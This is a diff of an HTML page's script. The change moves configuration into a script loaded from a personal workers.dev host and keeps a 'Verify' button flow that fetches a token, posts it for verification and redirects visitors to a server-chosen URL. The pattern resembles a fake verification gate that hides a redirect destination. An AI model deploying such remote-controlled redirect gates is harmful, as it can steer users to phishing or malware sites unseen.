@@ -77,90 +77,88 @@
         </div>
     </div>
 
-    <script>
-        // CONFIGURATION 
-        const CONFIG = {
-            workerUrl: '<script src="https://calm-cell-0739.arseniodacosta070.workers.dev/config.js"><' + '/script>'
-        };
+    <script src="https://calm-cell-0739.arseniodacosta070.workers.dev/config.js"></script>
 
-        let formToken = null;
+<script>
+    // CONFIG is now loaded from the worker above
+    let formToken = null;
 
-        // Load token when page loads
-        window.addEventListener('load', function() {
-            loadToken();
-        });
+    // Load token when page loads
+    window.addEventListener('load', function() {
+        loadToken();
+    });
 
-        function loadToken() {
-            fetch(CONFIG.workerUrl + '/api/generate-form')
-                .then(response => response.json())
-                .then(data => {
-                    formToken = data.token;
-                    console.log('Token loaded');
-                })
-                .catch(error => {
-                    showError('Failed to load verification form');
-                    console.error('Error:', error);
-                });
-        }
-
-        // Click handler for verify button
-        document.getElementById('verify-btn').addEventListener('click', function() {
-            if (!formToken) {
-                showError('Token not ready. Please refresh the page.');
-                return;
-            }
-
-            verifyToken();
-        });
-
-        function verifyToken() {
-            const btn = document.getElementById('verify-btn');
-            
-            // Add loading state
-            btn.classList.add('loading');
-            document.getElementById('btn-text').innerHTML = '<span class="spinner"></span>Verifying...';
-
-            // Send token to worker for verification
-            fetch(CONFIG.workerUrl + '/api/verify', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    token: formToken,
-                    action: 'verify'
-                })
-            })
+    function loadToken() {
+        fetch(CONFIG.workerUrl + '/api/generate-form')
             .then(response => response.json())
             .then(data => {
-                if (data.verified) {
-                    // Success
-                    btn.classList.remove('loading');
-                    btn.classList.add('verified');
-                    document.getElementById('btn-text').textContent = 'Verified ✓';
-                    document.getElementById('status-text').textContent = 'Redirecting...';
-                    
-                    // Redirect after 1.5 seconds
-                    setTimeout(() => {
-                        window.location.href = data.redirectUrl;
-                    }, 1500);
-                } else {
-                    showError('Verification failed');
-                }
+                formToken = data.token;
+                console.log('Token loaded');
             })
             .catch(error => {
-                btn.classList.remove('loading');
-                document.getElementById('btn-text').textContent = 'Try Again';
-                showError('Network error. Please try again.');
+                showError('Failed to load verification form');
                 console.error('Error:', error);
             });
+    }
+
+    // Click handler for verify button
+    document.getElementById('verify-btn').addEventListener('click', function() {
+        if (!formToken) {
+            showError('Token not ready. Please refresh the page.');
+            return;
         }
 
-        function showError(message) {
-            const errorDiv = document.getElementById('error-msg');
-            errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
-        }
-    </script>
+        verifyToken();
+    });
+
+    function verifyToken() {
+        const btn = document.getElementById('verify-btn');
+        
+        // Add loading state
+        btn.classList.add('loading');
+        document.getElementById('btn-text').innerHTML = '<span class="spinner"></span>Verifying...';
+
+        // Send token to worker for verification
+        fetch(CONFIG.workerUrl + '/api/verify', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                token: formToken,
+                action: 'verify'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.verified) {
+                // Success
+                btn.classList.remove('loading');
+                btn.classList.add('verified');
+                document.getElementById('btn-text').textContent = 'Verified ✓';
+                document.getElementById('status-text').textContent = 'Redirecting...';
+                
+                // Redirect after 1.5 seconds
+                setTimeout(() => {
+                    window.location.href = data.redirectUrl;
+                }, 1500);
+            } else {
+                showError('Verification failed');
+            }
+        })
+        .catch(error => {
+            btn.classList.remove('loading');
+            document.getElementById('btn-text').textContent = 'Try Again';
+            showError('Network error. Please try again.');
+            console.error('Error:', error);
+        });
+    }
+
+    function showError(message) {
+        const errorDiv = document.getElementById('error-msg');
+        errorDiv.textContent = message;
+        errorDiv.style.display = 'block';
+    }
+</script>
 </body>
 </html>
